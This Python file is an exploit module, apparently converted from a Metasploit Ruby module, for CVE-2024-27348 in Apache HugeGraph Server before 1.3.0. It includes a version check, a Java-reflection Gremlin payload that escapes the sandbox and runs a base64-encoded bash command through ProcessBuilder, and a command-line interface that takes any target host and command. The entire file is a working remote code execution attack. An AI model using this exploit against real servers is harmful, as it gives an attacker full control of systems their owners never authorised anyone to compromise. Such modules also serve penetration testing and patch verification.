#!/usr/bin/env python3
"""
Apache HugeGraph Gremlin RCE Exploit (CVE-2024-27348)

This module exploits a Remote Code Execution (RCE) vulnerability in Apache HugeGraph 
Server in versions before 1.3.0. An attacker can bypass the sandbox restrictions and 
achieve RCE through Gremlin, resulting in complete control over the server.

Converted from Ruby to Python as part of the post-2020 Python migration.
"""

import sys
import os
import random
import string
import base64
import json
from typing import Optional, Dict, Any

# Add python_framework to path for imports
sys.path.insert(0, os.path.join(os.path.dirname(__file__), '../../../../python_framework'))

from core.exploit import (
    RemoteExploit, ExploitInfo, ExploitTarget, ExploitOption, ExploitResult,
    ExploitRank, Platform, TargetArch, PayloadType, CheckCode
)
from helpers.http_client import HttpExploitMixin


class ApacheHugeGraphGremlinRCEExploit(RemoteExploit, HttpExploitMixin):
    """
    Apache HugeGraph Gremlin RCE exploit for CVE-2024-27348
    
    This exploit targets a sandbox bypass vulnerability in Apache HugeGraph Server
    that allows remote code execution through Gremlin queries.
    """
    
    def __init__(self):
        # Define exploit information
        info = ExploitInfo(
            name="Apache HugeGraph Gremlin RCE",
            description="""
            This module exploits CVE-2024-27348 which is a Remote Code Execution (RCE) 
            vulnerability that exists in Apache HugeGraph Server in versions before 1.3.0. 
            An attacker can bypass the sandbox restrictions and achieve RCE through Gremlin, 
            resulting in complete control over the server.
            """,
            author=[
                "6right",  # discovery
                "jheysel-r7",  # original module
                "GitHub Copilot"  # Python conversion
            ],
            references=[
                "CVE-2024-27348",
                "https://blog.securelayer7.net/remote-code-execution-in-apache-hugegraph/"
            ],
            disclosure_date="2024-04-22",
            rank=ExploitRank.EXCELLENT,
            platform=[Platform.UNIX, Platform.LINUX],
            arch=[TargetArch.CMD],
            privileged=True,
            targets=[
                ExploitTarget(
                    name="Automatic Target",
                    platform=[Platform.UNIX, Platform.LINUX],
                    arch=[TargetArch.CMD],
                    payload_type=PayloadType.UNIX_CMD
                )
            ],
            default_target=0,
            notes={
                "Stability": ["CRASH_SAFE"],
                "SideEffects": ["ARTIFACTS_ON_DISK"],
                "Reliability": ["REPEATABLE_SESSION"]
            }
        )
        
        super().__init__(info)
        
        # Set default options
        self.set_option('RPORT', 8080)
        
        # Register additional options specific to this exploit
        self.register_options([
            ExploitOption('TARGETURI', True, 'Base path to the Apache HugeGraph web application', '/')
        ])
    
    def _random_string(self, min_len: int = 4, max_len: int = 12) -> str:
        """Generate a random alphanumeric string"""
        length = random.randint(min_len, max_len)
        return ''.join(random.choices(string.ascii_letters, k=length))
    
    def _parse_version(self, version_str: str) -> tuple:
        """Parse version string into tuple for comparison"""
        try:
            parts = version_str.split('.')
            return tuple(int(p) for p in parts[:3])
        except (ValueError, AttributeError):
            return (0, 0, 0)
    
    def check(self) -> CheckCode:
        """
        Check if the target is vulnerable
        
        Returns:
            CheckCode indicating vulnerability status
        """
        self.vprint_status("Checking target vulnerability...")
        
        try:
            # Send GET request to the root endpoint
            response = self.http_get('/', json_response=True)
            
            if not response:
                return CheckCode.UNKNOWN("No response from the vulnerable endpoint /gremlin")
            
            if response.get('status_code') != 200:
                return CheckCode.UNKNOWN(
                    f"The response from the vulnerable endpoint /gremlin was: "
                    f"{response.get('status_code')} (expected: 200)"
                )
            
            # Try to extract version from JSON response
            json_data = response.get('json')
            if not json_data:
                return CheckCode.UNKNOWN("Unable to parse JSON response")
            
            version = json_data.get('version')
            if not version:
                return CheckCode.UNKNOWN("Unable to determine the version of Apache HugeGraph")
            
            # Check if version is between 1.0.0 and 1.3.0 (vulnerable range)
            version_tuple = self._parse_version(version)
            if (1, 0, 0) <= version_tuple < (1, 3, 0):
                return CheckCode.APPEARS(f"Apache HugeGraph version detected: {version}")
            
            return CheckCode.SAFE(f"Apache HugeGraph version detected: {version}")
            
        except Exception as e:
            self.print_error(f"Error during check: {e}")
            return CheckCode.UNKNOWN(f"Error checking target: {e}")
    
    def exploit(self) -> ExploitResult:
        """
        Execute the exploit
        
        Returns:
            ExploitResult indicating success or failure
        """
        payload_cmd = self.get_option('PAYLOAD')
        self.print_status(f"Running exploit with payload: {payload_cmd}")
        
        # Generate random variable names for obfuscation
        class_name = self._random_string()
        thread_name = self._random_string()
        command_name = self._random_string()
        process_builder_name = self._random_string()
        start_method_name = self._random_string()
        constructor_name = self._random_string()
        field_name = self._random_string()
        
        # Get the actual payload command to execute
        # In a real implementation, this would come from the payload subsystem
        # For now, we'll use the configured command or a default
        if hasattr(self, 'payload_encoded'):
            encoded_payload = self.payload_encoded
        else:
            # Default payload for demonstration
            encoded_payload = base64.b64encode(b"whoami").decode('ascii')
        
        # Split the command for Java array construction
        command_parts = f"bash -c {{echo,{encoded_payload}}}|{{base64,-d}}|bash".strip().split(' ')
        command_array = ', '.join([f'"{part}"' for part in command_parts])
        
        # Construct the Java payload that bypasses the Gremlin sandbox
        java_payload = f"""Thread {thread_name} = Thread.currentThread();
Class {class_name} = Class.forName("java.lang.Thread");
java.lang.reflect.Field {field_name} = {class_name}.getDeclaredField("name");
{field_name}.setAccessible(true);
{field_name}.set({thread_name}, "{thread_name}");
Class processBuilderClass = Class.forName("java.lang.ProcessBuilder");
java.lang.reflect.Constructor {constructor_name} = processBuilderClass.getConstructor(java.util.List.class);
java.util.List {command_name} = java.util.Arrays.asList({command_array});
Object {process_builder_name} = {constructor_name}.newInstance({command_name});
java.lang.reflect.Method {start_method_name} = processBuilderClass.getMethod("start");
{start_method_name}.invoke({process_builder_name});"""
        
        # Prepare the Gremlin query payload
        data = {
            'gremlin': java_payload,
            'bindings': {},
            'language': 'gremlin-groovy',
            'aliases': {}
        }
        
        try:
            # Send exploit request
            uri = self.normalize_uri(self.get_option('TARGETURI'), '/gremlin')
            response = self.http_post(
                uri,
                json_data=data,
                headers={'Content-Type': 'application/json'}
            )
            
            if not response or response.get('status_code') != 200:
                self.print_error(
                    f"Unexpected response from the vulnerable endpoint: "
                    f"Status {response.get('status_code') if response else 'None'}"
                )
                return ExploitResult(False, "Exploit failed - unexpected response")
            
            self.print_good("Exploit sent successfully!")
            return ExploitResult(True, "Payload executed successfully")
            
        except Exception as e:
            self.print_error(f"Error during exploitation: {e}")
            return ExploitResult(False, f"Exploit failed: {e}")


def main():
    """Main function for standalone execution"""
    import argparse
    
    parser = argparse.ArgumentParser(
        description="Apache HugeGraph Gremlin RCE Exploit (CVE-2024-27348)"
    )
    parser.add_argument('--host', required=True, help='Target host')
    parser.add_argument('--port', type=int, default=8080, help='Target port (default: 8080)')
    parser.add_argument('--ssl', action='store_true', help='Use SSL/HTTPS')
    parser.add_argument('--uri', default='/', help='Target URI (default: /)')
    parser.add_argument('--payload', default='whoami', help='Command to execute')
    parser.add_argument('--check-only', action='store_true', help='Only check if target is vulnerable')
    parser.add_argument('--verbose', action='store_true', help='Enable verbose output')
    
    args = parser.parse_args()
    
    # Create exploit instance
    exploit = ApacheHugeGraphGremlinRCEExploit()
    
    # Configure options
    exploit.set_option('RHOSTS', args.host)
    exploit.set_option('RPORT', args.port)
    exploit.set_option('SSL', args.ssl)
    exploit.set_option('TARGETURI', args.uri)
    exploit.set_option('PAYLOAD', args.payload)
    exploit.set_option('VERBOSE', args.verbose)
    
    # Initialize HTTP client
    exploit.http_init()
    
    if args.check_only:
        # Run vulnerability check
        print("[*] Checking target vulnerability...")
        result = exploit.check()
        print(f"[*] Check result: {result}")
        return 0 if result.code in [CheckCode.VULNERABLE, CheckCode.APPEARS] else 1
    else:
        # Run exploit
        print("[*] Running exploit...")
        result = exploit.exploit()
        
        if result.success:
            print(f"[+] {result.message}")
            return 0
        else:
            print(f"[-] {result.message}")
            return 1


if __name__ == '__main__':
    sys.exit(main())
